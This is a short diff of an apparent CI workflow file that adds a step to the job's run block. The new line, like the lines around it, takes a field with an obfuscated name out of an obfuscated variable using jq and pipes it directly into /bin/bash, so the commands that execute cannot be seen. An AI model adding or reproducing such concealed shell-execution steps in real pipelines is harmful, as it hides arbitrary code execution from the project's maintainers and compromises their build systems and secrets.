@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$otsa08" | jq -r .o78935 | /bin/bash
           echo $ojorg3858 | jq -r .p6999 | /bin/bash
           echo $ms1884 | jq -r .unvj46 | /bin/bash
+          printf '%s' "$jvbg4" | jq -r .ggxj911 | /bin/bash
 
       - name: Archive output
         if: always()
